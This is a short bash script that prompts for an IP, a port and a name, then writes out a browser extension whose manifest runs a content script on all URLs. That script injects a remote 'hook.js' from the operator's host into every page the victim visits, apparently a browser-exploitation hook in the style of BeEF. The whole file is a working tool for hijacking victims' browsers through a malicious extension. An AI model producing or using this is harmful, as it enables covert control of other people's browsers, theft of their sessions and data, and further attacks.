#!/bin/bash

#IP
echo -n "Your IP (Default: Current Host): "
read hostIP
if [ -z $hostIP ]; then
	hostIP="$(sudo ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')"
fi
#portf
echo -n "Port (Def. 3000): "
read port
if [ -z $port ]; then
	port=3000
fi


#Extension Name
echo -n "Extension Name: "

while [ true ]
do
	read name
	if [ -z $name ]; then
		echo -n "Extension Name: "
	else
		break
	fi
done

mkdir $name
cd $name
touch manifest.json
touch content.js

echo '{
  "manifest_version": 2,
  "name": "'$name'",
  "version": "0.1",
  "content_scripts": [
    {
      "matches": [
        "<all_urls>"
      ],
      "js": ["content.js"]
    }
  ]
}' > manifest.json
echo '
var hook = document.createElement("script");
hook.src = "http://'$hostIP':'$port'/hook.js";
document.head.appendChild(hook);
' > content.js
